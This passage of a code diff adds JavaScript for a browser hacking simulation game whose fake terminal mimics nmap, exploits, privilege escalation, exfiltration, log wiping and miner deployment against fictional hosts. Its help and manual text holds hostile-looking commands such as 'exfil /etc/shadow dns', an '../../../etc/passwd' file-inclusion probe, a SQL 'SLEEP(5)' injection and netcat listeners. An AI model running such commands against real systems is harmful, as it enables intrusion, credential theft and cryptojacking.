+  document.getElementById('title-actions').style.display = 'none';
+  document.getElementById('nc-handle').value = '';
+  document.getElementById('nc-handle').focus();
+}
+function hideNewChar() {
+  document.getElementById('new-char-panel').style.display = 'none';
+  document.getElementById('title-actions').style.display = 'block';
+}
+function createChar() {
+  var raw = document.getElementById('nc-handle').value.trim();
+  var handle = raw.toUpperCase().replace(/[^A-Z0-9_-]/g,'').substring(0,16);
+  if (!handle) { toast('Enter a valid callsign','e'); return; }
+  dbGetAll(function(saves) {
+    if (saves.find(function(s){ return s.handle === handle; })) { toast('Handle taken','e'); return; }
+    if (saves.length >= 3) { toast('Max 3 operatives','e'); return; }
+    G = defaultState(handle);
+    dbPut(G, function() { enterGame(); });
+  });
+}
+function selectChar(handle) {
+  dbGetAll(function(saves) {
+    var s = saves.find(function(x){ return x.handle === handle; });
+    if (!s) return;
+    G = JSON.parse(JSON.stringify(s));
+    if (!G.reconDone) G.reconDone = {};
+    if (!G.agents) G.agents = {};
+    if (!G.interceptMode) G.interceptMode = false;
+    enterGame();
+  });
+}
+function deleteChar(handle) {
+  if (!confirm('Delete operative ' + handle + '?')) return;
+  dbDelete(handle, function() { renderTitle(); });
+}
+function enterGame() {
+  document.getElementById('s-title').classList.remove('active');
+  document.getElementById('s-game').classList.add('active');
+  document.getElementById('tb-handle').textContent = G.handle;
+  renderTopbar(); renderWanted(); renderFS(); renderNetmap(); renderCveDb(); updatePrompt();
+  switchPane('terminal');
+  tPrint('sys', 'NETBREAKER OS v2.0 \u2014 Welcome, ' + G.handle + '.');
+  tPrint('dim', '\u20BF' + G.credits + '  REP: ' + G.rep);
+  tPrint('dim', '');
+  tPrint('dim', 'Type "help" for commands. Start: scan 192.168.10.0/24');
+  tPrint('hint', '\uD83D\uDCA1 cat walkthrough.txt \u2014 full guide (spoiler warning)');
+  tPrint('dim', '');
+  document.getElementById('term-input').focus();
+  setupKbOffset();
+}
+function goTitle() {
+  saveGame(); G = null; clearTerm();
+  document.getElementById('s-game').classList.remove('active');
+  document.getElementById('s-title').classList.add('active');
+  renderTitle();
+}
+
+// ═══════════════════════════ EVENTS ═══════════════════════════
+document.addEventListener('DOMContentLoaded', function() {
+  document.getElementById('btn-deploy').addEventListener('click', createChar);
+  document.getElementById('btn-cancel').addEventListener('click', hideNewChar);
+  document.getElementById('btn-new-op').addEventListener('click', showNewChar);
+  document.getElementById('nc-handle').addEventListener('keydown', function(e) { if (e.key==='Enter') createChar(); });
+
+  document.getElementById('char-grid').addEventListener('click', function(e) {
+    var del = e.target.closest('[data-del]');
+    if (del) { e.stopPropagation(); deleteChar(del.getAttribute('data-del')); return; }
+    var slot = e.target.closest('.char-slot');
+    if (!slot) return;
+    if (slot.classList.contains('new-slot')) { showNewChar(); return; }
+    var h = slot.getAttribute('data-handle');
+    if (h) selectChar(h);
+  });
+
+  document.getElementById('btn-shop').addEventListener('click', openShopModal);
+  document.getElementById('btn-quit').addEventListener('click', goTitle);
+
+  document.getElementById('tabbar').addEventListener('click', function(e) {
+    var t = e.target.closest('.tab');
+    if (t) switchPane(t.getAttribute('data-pane'));
+  });
+
+  document.getElementById('term-input').addEventListener('keydown', termKeyDown);
+  document.getElementById('btn-go').addEventListener('click', browserGo);
+  document.getElementById('browser-url').addEventListener('keydown', function(e) { if (e.key==='Enter') browserGo(); });
+  document.getElementById('btn-icpt').addEventListener('click', toggleIntercept);
+  document.getElementById('btn-curl').addEventListener('click', openCurlBuilder);
+  document.getElementById('btn-fuzz').addEventListener('click', openFuzzer);
+  document.getElementById('btn-cook').addEventListener('click', openCookies);
+  document.getElementById('btn-diff').addEventListener('click', openDiff);
+  document.getElementById('btn-fwd').addEventListener('click', function() { tPrint('sys','[Intercept] Forwarded.'); toast('Forwarded'); });
+  document.getElementById('btn-drop').addEventListener('click', function() { tPrint('sys','[Intercept] Dropped.'); toast('Dropped','w'); });
+  document.getElementById('btn-sendmod').addEventListener('click', sendModified);
+
+  document.getElementById('modal-bg').addEventListener('click', function(e) { if (e.target===this) closeModal(); });
+  document.getElementById('modal-x').addEventListener('click', closeModal);
+  document.getElementById('cve-search').addEventListener('input', renderCveDb);
+
+  document.getElementById('cve-body').addEventListener('click', function(e) {
+    var card = e.target.closest('.cve-card');
+    if (card) { var d = card.querySelector('.cve-detail'); if (d) d.classList.toggle('open'); }
+  });
+  document.getElementById('net-targets').addEventListener('click', function(e) {
+    var card = e.target.closest('.nc');
+    if (card && !card.classList.contains('lkd')) showTargetModal(card.getAttribute('data-id'));
+  });
+
+  setInterval(function() { if (G) saveGame(); }, 15000);
+  setInterval(function() {
+    if (G && G.wanted > 0) {
+      var r = G.tools.indexOf('tor')>=0 ? 2 : G.tools.indexOf('vpn-chain')>=0 ? 0.5 : 0.1;
+      G.wanted = Math.max(0, G.wanted - r);
+      renderWanted();
+    }
+    if (G && G.miners && Object.keys(G.miners).length > 0) {
+      var income = Object.values(G.miners).reduce(function(a,m){return a+m.rate;},0);
+      G.credits += income;
+      renderTopbar();
+      toast('⛏ Mining: +₿' + income);
+    }
+  }, 30000);
+
+  initDB(function() { renderTitle(); });
+});
+
+// ═══════════════════════════ KEYBOARD OFFSET ═══════════════════════════
+function setupKbOffset() {
+  var inp = document.getElementById('term-input');
+  var game = document.getElementById('s-game');
+  function apply() {
+    if (document.activeElement===inp && window.visualViewport) {
+      var off = window.innerHeight - window.visualViewport.height;
+      game.style.paddingBottom = off>50 ? off+'px' : '0';
+      var out = document.getElementById('term-output');
+      out.scrollTop = out.scrollHeight;
+    }
+  }
+  inp.addEventListener('focus', function() { setTimeout(apply, 300); });
+  inp.addEventListener('blur', function() { game.style.paddingBottom='0'; });
+  if (window.visualViewport) window.visualViewport.addEventListener('resize', apply);
+}
+
+// ═══════════════════════════ TERMINAL ═══════════════════════════
+var tHist = [], tIdx = -1;
+function tPrint(cls, text) {
+  var el = document.getElementById('term-output');
+  var d = document.createElement('span');
+  d.className = 'tl ' + (cls||'');
+  d.textContent = (text===''||text==null) ? '\u00A0' : String(text);
+  el.appendChild(d);
+  el.scrollTop = el.scrollHeight;
+}
+function clearTerm() { var el=document.getElementById('term-output'); if(el) el.innerHTML=''; }
+function termFocus() { document.getElementById('term-input').focus(); }
+
+function termKeyDown(e) {
+  var inp = e.target;
+  if (e.key==='Enter') {
+    var cmd = inp.value.trim(); if (!cmd) return;
+    var s=G.session, co=s.connected?COMPANIES.find(function(c){return c.id===s.targetId;}):null;
+    tPrint('cmd', (s.connected ? s.user+'@'+(co?co.domain:'?')+':'+s.cwd+'$' : G.handle+'@nb:~$')+' '+cmd);
+    tHist.unshift(cmd); tIdx=-1; inp.value='';
+    runCommand(cmd);
+  } else if (e.key==='ArrowUp') {
+    e.preventDefault();
+    if (tIdx<tHist.length-1) { tIdx++; inp.value=tHist[tIdx]||''; }
+  } else if (e.key==='ArrowDown') {
+    e.preventDefault();
+    if (tIdx>0) { tIdx--; inp.value=tHist[tIdx]||''; } else { tIdx=-1; inp.value=''; }
+  } else if (e.key==='Tab') {
+    e.preventDefault();
+    var all=['help','man','clear','whoami','scan','nmap','ping','gobuster','deploy','agents',
+             'exploit','brute','ssh','ftp','nc','ls','cd','cat','pwd','privesc','persist',
+             'exfil','curl','contracts','shop','editor','run','disconnect','cve','pivot'];
+    var p=inp.value.toLowerCase();
+    var m=all.find(function(c){return c.startsWith(p)&&c!==p;});
+    if (m) inp.value=m;
+  }
+}
+function updatePrompt() {
+  var s=G?G.session:null, co=s&&s.connected?COMPANIES.find(function(c){return c.id===s.targetId;}):null;
+  document.getElementById('term-prompt').textContent =
+    s&&s.connected ? s.user+'@'+(co?co.domain:'?')+':'+s.cwd+'$ ' : (G?G.handle:'guest')+'@nb:~$ ';
+}
+function termExec(cmd) { tPrint('cmd','> '+cmd); runCommand(cmd); }
+
+// ═══════════════════════════ COMMANDS ═══════════════════════════
+function runCommand(raw) {
+  var parts=raw.trim().split(/\s+/), cmd=parts[0].toLowerCase(), args=parts.slice(1);
+  var s=G.session, tgt=s.connected?COMPANIES.find(function(c){return c.id===s.targetId;}):null;
+  var map={
+    help:cmdHelp, man:function(){cmdMan(args[0]);}, clear:clearTerm,
+    pwd:function(){tPrint('',s.cwd||'~');}, whoami:cmdWhoami,
+    ping:function(){cmdPing(args);}, scan:function(){cmdScan(args);},
+    nmap:function(){cmdNmap(args);}, gobuster:function(){cmdGobuster(args);},
+    deploy:function(){cmdDeploy(args);}, agents:cmdAgents,
+    ssh:function(){cmdSsh(args);}, ftp:function(){cmdFtp(args);},
+    nc:function(){cmdNc(args);}, exploit:function(){cmdExploit(args);},
+    brute:function(){cmdBrute(args);},
+    ls:function(){cmdLs(args,s,tgt);}, cd:function(){cmdCd(args,s,tgt);},
+    cat:function(){cmdCat(args,s,tgt);}, privesc:function(){cmdPrivesc(args,s,tgt);},
+    persist:function(){cmdPersist(args,s,tgt);}, exfil:function(){cmdExfil(args,s,tgt);},
+    curl:function(){cmdCurl(args);}, contracts:cmdContracts,
+    shop:openShopModal, editor:openEditorModal, run:function(){cmdRun(args);},
+    disconnect:cmdDisc, cve:function(){cmdCve(args);},
+    pivot:function(){cmdPivot(args,s,tgt);},
+    clearlogs:function(){cmdClearLogs(args,s,tgt);},
+    rotateip:cmdRotateIp,
+    miners:cmdMiners
+  };
+  if (map[cmd]) map[cmd]();
+  else { tPrint('err','-bash: '+cmd+': command not found'); tPrint('dim','Type "help" for commands.'); }
+}
+
+function cmdHelp() {
+  tPrint('hdr','NETBREAKER COMMAND REFERENCE');
+  tPrint('','');
+  tPrint('sys','RECON');
+  tPrint('dim','  scan <subnet>       Ping sweep e.g. scan 192.168.10.0/24');
+  tPrint('dim','  nmap [-sV -sC] <ip> Port/service/vuln scan');
+  tPrint('dim','  gobuster <ip>       Web directory brute-force');
+  tPrint('dim','  deploy sniffer <ip> Deploy passive credential sniffer');
+  tPrint('dim','  agents              View agent results');
+  tPrint('','');
+  tPrint('sys','EXPLOITATION');
+  tPrint('dim','  exploit <vuln> <ip> Run exploit module');
+  tPrint('dim','  brute <svc> <ip>    Credential brute force');
+  tPrint('dim','  nc <ip> <port>      Netcat connection');
+  tPrint('dim','  curl <url>          Manual HTTP request');
+  tPrint('','');
+  tPrint('sys','ACCESS');
+  tPrint('dim','  ssh [user@]<ip>     SSH login');
+  tPrint('dim','  ftp <ip>            FTP connection');
+  tPrint('dim','  disconnect          Close session');
+  tPrint('','');
+  tPrint('sys','FILESYSTEM (on target)');
+  tPrint('dim','  ls [path]  cd <path>  cat <file>  pwd');
+  tPrint('','');
+  tPrint('sys','POST-EXPLOITATION');
+  tPrint('dim','  privesc [method]    Privilege escalation');
+  tPrint('dim','  persist <method>    Install persistence');
+  tPrint('dim','  exfil <path> [how]  Exfiltrate file');
+  tPrint('dim','  pivot <src> <dst>   Pivot through host');
+  tPrint('','');
+  tPrint('sys','VIRTUAL FILES');
+  tPrint('dim','  cat walkthrough.txt Full operator guide');
+  tPrint('dim','  cat tools.txt       Installed tools + commands');
+  tPrint('dim','  cat exploits.txt    Quick exploit reference');
+  tPrint('','');
+  tPrint('sys','OTHER');
+  tPrint('dim','  contracts  shop  editor  cve <term>  whoami  man <cmd>  clear');
+  tPrint('','');
+  tPrint('sys','OPSEC & MINING');
+  tPrint('dim','  clearlogs [ip]     Wipe logs on target or locally (reduces wanted)');
+  tPrint('dim','  rotateip           Rotate attacker IP via proxy chain (wanted -2)');
+  tPrint('dim','  deploy miner <ip>  Deploy XMR miner on rooted host (passive income)');
+  tPrint('dim','  miners             View active miners and income rate');
+  tPrint('','');
+  tPrint('hint','\uD83D\uDCA1 man <cmd> for docs. CVE-DB tab for exploit details.');
+}
+
+function cmdMan(topic) {
+  var pages = {
+    exploit:'NAME: exploit\nSYNOPSIS: exploit <vuln> <ip>\nEXAMPLES:\n  exploit CVE-2017-7679 192.168.10.14\n  exploit vsftpd-backdoor 192.168.10.14\n  exploit CVE-2020-1938 10.0.5.22\n  exploit CVE-2022-1388 172.16.5.100\n  exploit S7-auth-bypass 10.10.1.5\n  exploit sqli / xss / lfi / csrf / idor <ip>\nREQUIRES: metasploit for CVE exploits.',
+    exfil:'NAME: exfil\nSYNOPSIS: exfil <path> [http|https|dns]\n  http  = noisy, triggers IDS\n  https = encrypted, low-noise\n  dns   = covert, avoids DLP\nEXAMPLES:\n  exfil /root/flag.txt https\n  exfil /etc/shadow dns',
+    privesc:'NAME: privesc\nSYNOPSIS: privesc [method]\nMETHODS: linpeas sudo suid cron token hmi-admin\nTIP: Always try "privesc linpeas" first.',
+    nmap:'NAME: nmap\nSYNOPSIS: nmap [flags] <ip>\nFLAGS: -sV (versions) -sC (scripts) -O (OS) -p- (all)\nTIP: VULN notes reveal which CVEs apply.',
+    deploy:'NAME: deploy\nSYNOPSIS: deploy <type> <ip>\nTYPES: sniffer crawler\nTIP: sniffer is silent. Does not trigger IDS.',
+    curl:'NAME: curl\nSYNOPSIS: curl <url> [-X method] [-d data]\nTIP: Use INTERCEPT in browser for point-and-click.',
+    clearlogs:'NAME: clearlogs\nSYNOPSIS: clearlogs [ip]\n  No arg = clears local traces (wanted -1)\n  With IP = wipes target logs (wanted -2)\nREQUIRES: log-cleaner tool from shop\nEXAMPLES:\n  clearlogs\n  clearlogs 192.168.10.14',
+    rotateip:'NAME: rotateip\nSYNOPSIS: rotateip\nEffect: Breaks active traces. Reduces wanted by 2.\nREQUIRES: ip-rotator tool from shop\nNOTE: One-time effect. Buy TOR for continuous protection.',
+    miner:'NAME: deploy miner\nSYNOPSIS: deploy miner <ip>\nEFFECT: Deploys XMR miner on rooted host. Passive credit income every 30s.\nRATES: easy=8, med=18, hard=35, elite=80 per tick\nMining Pool doubles all rates.\nREQUIRES: Root access + miner tool from shop.',
+    brute:'NAME: brute\nSYNOPSIS: brute <service> <ip>\nSERVICES: ssh ftp mysql http-form\nREQUIRES: hydra\nWARNING: Noisy. Triggers IDS on protected targets.'
+  };
+  if (!topic) { tPrint('err','Usage: man <cmd>'); tPrint('dim','Available: exploit exfil privesc nmap deploy curl brute'); return; }
+  var m = pages[topic.toLowerCase()];
+  if (!m) { tPrint('err','No manual entry for: '+topic); return; }
+  m.split('\n').forEach(function(l){ tPrint('pre',l); });
+}
+
+function cmdWhoami() {
+  var s=G.session, co=s.connected?COMPANIES.find(function(c){return c.id===s.targetId;}):null;
+  if (s.connected&&co) {
+    tPrint('','uid='+(s.isRoot?'0(root)':'1001('+s.user+')'));
+    tPrint('dim','Host: '+co.domain+' ('+co.ip+')  CWD: '+s.cwd);
+    tPrint('dim','Root: '+(s.isRoot?'YES':'NO -- run privesc'));
+  } else {
+    tPrint('',G.handle+'@netbreaker');
+    tPrint('dim','\u20BF'+G.credits+'  REP: '+G.rep+'  Heat: '+G.wanted+'/5');
+    tPrint('dim','Tools: '+G.tools.join(', '));
+  }
+}
+
+function cmdPing(args) {
+  var ip=args[0]; if(!ip){tPrint('err','Usage: ping <ip>');return;}
+  var co=COMPANIES.find(function(c){return c.ip===ip;});
+  after(400,function(){
+    if(co&&G.discovered.indexOf(co.id)>=0) tPrint('ok','PING '+ip+': 64 bytes icmp_seq=1 ttl=64 time=12.3ms');
+    else tPrint('err','PING '+ip+': Request timeout.');
+  });
+}
+
+function cmdScan(args) {
+  var subnet=args[0]; if(!subnet){tPrint('err','Usage: scan <subnet>  e.g. scan 192.168.10.0/24');return;}
+  tPrint('sys','[*] Ping sweep: '+subnet+'...');
+  after(1400,function(){
+    var base=subnet.split('.').slice(0,3).join('.');
+    var hits=G.discovered.map(function(id){return COMPANIES.find(function(c){return c.id===id;});})
+      .filter(function(co){return co&&co.ip.startsWith(base);});
+    if(!hits.length){
+      tPrint('dim','[*] No hosts on '+subnet);
+      tPrint('dim','    Try: 192.168.10.0/24  10.0.5.0/24  172.16.5.0/24  10.10.1.0/24');
+      return;
+    }
+    tPrint('ok','[+] '+hits.length+' host(s) up:');
+    hits.forEach(function(co){
+      tPrint('ok','    '+co.ip.padEnd(16,' ')+' '+co.domain);
+      if(!G.reconDone[co.id]) G.reconDone[co.id]={};
+      G.reconDone[co.id].ping=true;
+    });
+    tPrint('dim','[*] Run "nmap -sV -sC <ip>" on discovered hosts.');
+    var scanReward = hits.length * 10;
+    G.credits += scanReward;
+    tPrint('ok','[+] Recon bonus: +₿' + scanReward + ' credits');
+    renderTopbar();
+    checkUnlock(); renderNetmap(); saveGame();
+  });
+}
+
+function cmdNmap(args) {
+  var flags=args.filter(function(a){return a.startsWith('-');});
+  var ip=args.find(function(a){return !a.startsWith('-');});
+  if(!ip){tPrint('err','Usage: nmap [-sV] [-sC] [-O] <ip>');return;}
+  var co=COMPANIES.find(function(c){return c.ip===ip;});
+  if(!co||G.discovered.indexOf(co.id)<0){tPrint('err','Host not discovered: '+ip+'. Run "scan" first.');return;}
+  var hasV=flags.some(function(f){return ['-sv','-a','-sc'].indexOf(f.toLowerCase())>=0;});
+  var hasC=flags.some(function(f){return ['-sc','-a'].indexOf(f.toLowerCase())>=0;});
+  tPrint('sys','[*] Nmap on '+ip+' ('+co.domain+')...');
+  if(co.sec.ids){tPrint('warn','[!] IDS may detect this scan');riseWanted(0.5);}
+  after(2000,function(){
+    tPrint('pre','Nmap scan report for '+co.domain+' ('+ip+')');
+    tPrint('pre','Host is up (0.021s latency).');tPrint('pre','');
+    tPrint('pre','PORT      STATE  SERVICE'+(hasV?'    VERSION':''));
+    co.ports.forEach(function(p){
+      tPrint('pre',(p.num+'/tcp').padEnd(10,' ')+'open   '+p.svc+(hasV?'  '+p.ver:''));
+      if(hasC&&p.vuln&&p.vuln!=='none') tPrint('warn','           |_ VULN: '+p.vuln+' -- '+p.note);
+    });
+    if(hasV){
+      tPrint('pre','');
+      if(co.sec.fw)  tPrint('warn','[!] Firewall: filtered packets detected');
+      if(co.sec.ids) tPrint('warn','[!] IDS: signature match active');
+      if(co.sec.waf) tPrint('warn','[!] WAF: web application firewall active');
+    }
+    tPrint('dim','[*] Check CVE-DB tab for exploit details.');
+    var nmapBonus = co.ports.filter(function(p){return p.vuln&&p.vuln!=='none';}).length * 15;
+    G.credits += nmapBonus;
+    tPrint('ok','[+] Recon bonus: +₿' + nmapBonus + ' credits (' + co.ports.filter(function(p){return p.vuln&&p.vuln!=='none';}).length + ' vulns found)');
+    renderTopbar();
+    if(!G.reconDone[co.id]) G.reconDone[co.id]={};
+    G.reconDone[co.id].nmap=true;
+    renderNetmap(); checkUnlock(); saveGame();
+  });
+}
+
+function cmdGobuster(args) {
+  var ip=args.find(function(a){return !a.startsWith('-');});
+  if(!ip){tPrint('err','Usage: gobuster <ip>');return;}
+  if(G.tools.indexOf('gobuster')<0){tPrint('err','[!] gobuster not installed. Buy in shop.');return;}
+  var co=COMPANIES.find(function(c){return c.ip===ip||c.domain===ip;});
+  if(!co||G.discovered.indexOf(co.id)<0){tPrint('err','Unknown target.');return;}
+  tPrint('sys','[*] Gobuster on http://'+co.domain+'...');
+  after(2000,function(){
+    var paths={
+      c0:['200  /index.php','200  /login.php','403  /config.php','200  /search.php','200  /api/','200  /api/users.php'],
+      c1:['200  /portal','301  /admin','200  /api/','200  /upload/','403  /jenkins/'],
+      c2:['200  /kibana/','200  /api/v2/','302  /portal','403  /internal/'],
+      c3:['200  /hmi/','200  /scada-api/','403  /admin/'],
+    };
+    tPrint('ok','[+] Paths on '+co.domain+':');
+    (paths[co.id]||['200  /index.html']).forEach(function(p){tPrint('dim','    '+p);});
+    if(!G.reconDone[co.id]) G.reconDone[co.id]={};
+    G.reconDone[co.id].gobuster=true;
+    tPrint('dim','[*] Browse paths in Browser pane.');
+    G.credits += 20;
+    tPrint('ok','[+] Recon bonus: +₿20 credits');
+    renderTopbar();
+    saveGame();
+  });
+}
+
+function cmdDeploy(args) {
+  var type=args[0],ip=args[1];
+  if(type==='miner'){cmdDeployMiner(ip);return;}
+  if(!type||!ip){tPrint('err','Usage: deploy <sniffer|crawler|miner> <ip>');return;}
+  var co=COMPANIES.find(function(c){return c.ip===ip||c.id===ip;});
+  if(!co||G.discovered.indexOf(co.id)<0){tPrint('err','Target not discovered.');return;}
+  if(!G.agents[co.id]) G.agents[co.id]=[];
+  if(G.agents[co.id].find(function(a){return a.type===type;})){tPrint('warn',type+' already deployed.');return;}
+  tPrint('sys','[*] Deploying '+type+' on '+co.domain+'...');
+  after(1500,function(){
+    var creds=Object.entries(co.creds||{}),found=creds[0];
+    var results=type==='sniffer'
+      ?['Capture: '+co.domain,'Packets: 4218 over 45min',found?'[CRED] '+found[0]+' : '+found[1]:'[INFO] No plaintext creds','[DNS] Internal: db.'+co.domain]
+      :['Crawled: http://'+co.domain,'Tech: '+co.ports.map(function(p){return p.svc;}).join(', ')];
+    G.agents[co.id].push({type:type,deployed:Date.now(),results:results});
+    if(type==='sniffer'){if(!G.reconDone[co.id])G.reconDone[co.id]={};G.reconDone[co.id].sniffer=true;}
+    tPrint('ok','[+] '+type+' deployed. Run "agents" to view.');
+    if(type==='sniffer'){ G.credits+=30; tPrint('ok','[+] Intel bonus: +₿30 credits'); renderTopbar(); }
+    saveGame(); renderNetmap();
+  });
+}
+
+function cmdAgents() {
+  var ids=Object.keys(G.agents);
+  if(!ids.length){tPrint('dim','No agents. Use: deploy sniffer <ip>');return;}
+  ids.forEach(function(id){
+    var co=COMPANIES.find(function(c){return c.id===id;});
+    tPrint('sys','['+(co?co.domain:id)+']');
+    G.agents[id].forEach(function(a){
+      tPrint('ok','  '+a.type.toUpperCase());
+      a.results.forEach(function(r){tPrint('dim','    '+r);});
+    });
+  });
+}
+
+function cmdSsh(args) {
+  var uh=args.find(function(a){return a.includes('@');})||args[0];
+  if(!uh){tPrint('err','Usage: ssh user@<ip>');return;}
+  var user,ip;
+  if(uh.includes('@')){var sp=uh.split('@');user=sp[0];ip=sp[1];}
+  else{ip=uh;user='root';}
+  var co=COMPANIES.find(function(c){return c.ip===ip;});
+  if(!co){tPrint('err','ssh: '+ip+': No route to host');return;}
+  if(!co.ports.find(function(p){return p.num===22;})){tPrint('err','ssh: Connection refused');return;}
+  var recon=G.reconDone[co.id]||{};
+  if(!recon.ping&&!recon.nmap){tPrint('err','ssh: Host unreachable. Run "scan" first.');return;}
+  var known=co.creds[user],hasPwned=G.pwned[co.id]&&G.pwned[co.id].hasShell;
+  if(!known&&!hasPwned){
+    tPrint('err',user+'@'+ip+': Permission denied (publickey,password).');
+    tPrint('dim','Hint: "deploy sniffer '+ip+'" or "brute ssh '+ip+'"');
+    return;
+  }
+  tPrint('sys','[*] ssh '+user+'@'+ip+'...');
+  after(700,function(){
+    tPrint('ok','Connected to '+co.domain+'.');
+    G.credits += 50;
+    tPrint('ok','[+] Access bonus: +₿50 credits');
+    renderTopbar();
+    if(!G.pwned[co.id]) G.pwned[co.id]={hasShell:false,hasRoot:false,exfilled:[],persisted:false};
+    G.pwned[co.id].hasShell=true;
+    if(user==='root') G.pwned[co.id].hasRoot=true;
+    G.session={connected:true,targetId:co.id,user:user,cwd:'/',isRoot:user==='root'};
+    updatePrompt(); renderFS(); saveGame();
+    if(co.sec.ids){triggerIDS(co);riseWanted(1);}
+  });
+}
+
+function cmdFtp(args) {
+  var ip=args[0]; if(!ip){tPrint('err','Usage: ftp <ip>');return;}
+  var co=COMPANIES.find(function(c){return c.ip===ip;});
+  if(!co||!co.ports.find(function(p){return p.num===21;})){tPrint('err','ftp: Connection refused');return;}
+  after(500,function(){
+    tPrint('ok','220 (vsFTPd 2.3.4)');
+    tPrint('warn','[!] vsftpd 2.3.4 -- known backdoor version');
+    tPrint('dim','    Exploit: exploit vsftpd-backdoor '+ip);
+  });
+}
+
+function cmdNc(args) {
+  if(G.tools.indexOf('netcat')<0){tPrint('err','nc: command not found');return;}
+  if(args.indexOf('-lvnp')>=0||args.indexOf('-l')>=0){
+    var p=args[args.indexOf('-lvnp')+1]||args[1]||'4444';
+    tPrint('ok','Listening on 0.0.0.0:'+p);tPrint('dim','[Waiting for connection...]');return;
+  }
+  var ip=args[0],port=args[1];
+  if(!ip||!port){tPrint('','usage: nc [-lvnp port] [host] [port]');return;}
+  var co=COMPANIES.find(function(c){return c.ip===ip;});
+  if(co&&port==='6200'&&G.pwned[co.id]&&G.pwned[co.id].backdoor){
+    tPrint('ok','Connection to '+ip+' 6200 succeeded!');
+    tPrint('pre','uid=0(root) gid=0(root)');
+    if(!G.pwned[co.id]) G.pwned[co.id]={hasShell:false,hasRoot:false,exfilled:[],persisted:false};
+    G.pwned[co.id].hasShell=true; G.pwned[co.id].hasRoot=true;
+    G.session={connected:true,targetId:co.id,user:'root',cwd:'/',isRoot:true};
+    updatePrompt(); renderFS(); saveGame();
+  } else tPrint('err','nc: '+ip+': Connection refused');
+}
+
+function cmdExploit(args) {
+  var vuln=args[0],ip=args[1];
+  if(!vuln||!ip){tPrint('err','Usage: exploit <vuln> <ip>');tPrint('dim','man exploit  or  CVE-DB tab');return;}
+  var webVulns=['sqli','sqli-blind','xss','lfi','csrf','idor'];
+  var isWeb=webVulns.indexOf(vuln.toLowerCase())>=0;
+  if(!isWeb&&G.tools.indexOf('metasploit')<0){tPrint('err','[!] Metasploit required. Buy in shop.');return;}
+  var co=COMPANIES.find(function(c){return c.ip===ip;});
+  if(!co||G.discovered.indexOf(co.id)<0){tPrint('err','Unknown target.');return;}
+  var recon=G.reconDone[co.id]||{},req=co.scanReq||{};
+  if(!isWeb&&req.nmap&&!recon.nmap){tPrint('err','[!] Run "nmap -sV -sC '+ip+'" first.');return;}
+  if(!isWeb&&req.gobuster&&!recon.gobuster){tPrint('err','[!] Run "gobuster '+ip+'" first.');return;}
+  if(!isWeb&&req.sniffer&&!recon.sniffer){tPrint('err','[!] Run "deploy sniffer '+ip+'" first.');return;}
+  if(co.sec.ids){triggerIDS(co);riseWanted(1);}
+  if(isWeb){runWebExploit(vuln,co);return;}
+  var port=co.ports.find(function(p){
+    if(!p.vuln||p.vuln==='none') return false;
+    var vl=vuln.toLowerCase(),pl=p.vuln.toLowerCase();
+    return pl===vl||vl.includes(pl.split('-')[0]);
+  });
+  if(!port){tPrint('err','[-] No module for "'+vuln+'" on '+ip+'.');tPrint('dim','Run nmap -sV -sC '+ip+' first.');return;}
+  tPrint('sys','[*] Loading: '+vuln);
+  tPrint('sys','[*] Target: '+ip+':'+port.num+' ('+port.svc+' '+port.ver+')');
+  after(1200,function(){
+    tPrint('sys','[*] Sending payload...');
+    after(1500,function(){
+      if(co.sec.fw&&G.tools.indexOf('tor')<0&&G.tools.indexOf('vpn-chain')<0&&Math.random()>0.65){
+        tPrint('err','[-] Exploit blocked by firewall.');tPrint('dim','Buy VPN Chain or TOR.');return;
+      }
+      if(!G.pwned[co.id]) G.pwned[co.id]={hasShell:false,hasRoot:false,exfilled:[],persisted:false};
+      var vl=vuln.toLowerCase();
+      if(vl.includes('vsftpd')||vl.includes('backdoor')){
+        tPrint('ok','[+] Backdoor triggered! Bind shell on port 6200.');
+        tPrint('ok','[+] Connect: nc '+ip+' 6200');
+        G.pwned[co.id].backdoor=true; G.pwned[co.id].hasShell=true; G.pwned[co.id].hasRoot=true;
+        G.session={connected:true,targetId:co.id,user:'root',cwd:'/',isRoot:true};
+        updatePrompt(); renderFS(); saveGame();
+        tPrint('dim','Root shell active. Proceed to persist and exfil.');
+        G.credits += 150; tPrint('ok','[+] Root shell bonus: +₿150 credits'); renderTopbar();
+      } else if(vl.includes('2020-1938')){
+        tPrint('ok','[+] Ghostcat AJP connected!');
+        tPrint('ok','[+] Reading /opt/tomcat/conf/tomcat-users.xml...');
+        after(600,function(){
+          var c=(co.fc||{})['/opt/tomcat/conf/tomcat-users.xml']||'[read OK]';
+          c.split('\n').forEach(function(l){tPrint('pre',l);});
+          G.pwned[co.id].hasShell=true;
+          G.session={connected:true,targetId:co.id,user:'tomcat',cwd:'/',isRoot:false};
+          updatePrompt(); renderFS(); saveGame();
+          tPrint('dim','Shell as tomcat. Next: privesc linpeas');
+        });
+      } else {
+        tPrint('ok','[+] Exploit successful! Shell as: www-data');
+        G.credits += 75; tPrint('ok','[+] Exploit bonus: +₿75 credits'); renderTopbar();
+        G.pwned[co.id].hasShell=true;
+        G.session={connected:true,targetId:co.id,user:'www-data',cwd:'/',isRoot:false};
+        updatePrompt(); renderFS(); saveGame();
+        tPrint('dim','Next: privesc linpeas to escalate.');
+      }
+    });
+  });
+}
+
+function runWebExploit(vuln,co) {
+  var guides={
+    sqli:'[SQLi]\n[*] Testing '+co.domain+'/login.php...\n[+] Auth bypassed!\n[+] Dump: marcus.reed / Pipeline2019!\n[!] Use INTERCEPT or FUZZER in browser',
+    'sqli-blind':'[Blind SQLi]\n[*] Time-based: AND SLEEP(5)\n[+] Response delayed 5s -- vulnerable!\n[*] Use exploit sqli for faster extraction',
+    xss:'[XSS]\n[*] Testing input fields...\n[+] /search.php reflects input without encoding\n[+] Stored XSS: contact/comment fields also vulnerable\n[!] Use FUZZER to auto-test',
+    lfi:'[LFI]\n[*] Testing: /portal?page=../../../etc/passwd\n[+] LFI confirmed -- file contents returned',
+    csrf:'[CSRF]\n[*] Checking forms for tokens...\n[+] POST /login -- no CSRF token!\n[!] Use INTERCEPT to craft payload',
+    idor:'[IDOR]\n[*] Testing /api/users.php?id=1 then id=2\n[+] Returns data for any user without auth check\n[!] Browse /api/users in Browser pane'
+  };
+  var g=guides[vuln.toLowerCase()]||'['+vuln+']\n[+] Web exploit on '+co.domain;
+  after(700,function(){
+    g.split('\n').forEach(function(l){
+      if(l.startsWith('[+]')) tPrint('ok',l);
+      else if(l.startsWith('[!]')) tPrint('warn',l);
+      else if(l.startsWith('[*]')) tPrint('sys',l);
+      else tPrint('pre',l);
+    });
+  });
+}
+
+function cmdBrute(args) {
+  var svc=args[0],ip=args[1];
